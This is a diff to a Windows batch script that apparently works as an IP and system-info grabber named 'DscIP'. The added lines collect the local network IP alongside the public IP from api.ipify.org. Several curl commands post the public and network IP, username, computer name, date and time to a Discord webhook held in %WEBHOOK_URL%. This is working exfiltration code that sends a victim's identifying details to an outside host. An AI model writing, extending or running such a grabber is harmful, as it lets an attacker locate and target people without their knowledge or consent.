@@ -56,8 +56,10 @@ SET Provide_additional_information=TRUE
 
 
 
-Rem Ip
+Rem PublicIP
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
+Rem NetIP
+for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 
 
 
@@ -76,7 +78,7 @@ goto quit
 Rem hook(x)
 :X
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
-curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```IP(IPV4) : %PublicIP% ```\"}" %WEBHOOK_URL%
+curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Public IP : %PublicIP%,NetworkIP : %NetworkIP% ```\"}" %WEBHOOK_URL%
 goto quit
 
 
@@ -84,7 +86,7 @@ goto quit
 Rem hook(O)
 :O
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
-curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```IP(IPV4) : %PublicIP% ```\"}" %WEBHOOK_URL%
+curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Public IP : %PublicIP%,NetworkIP : %NetworkIP% ```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```---------------------------------------------------------------------------```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Name Infrom [ Username : %username%, ComputerName : %computername% ]```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Time Infrom [ Date,Time : %date% %time% ]```\"}" %WEBHOOK_URL%
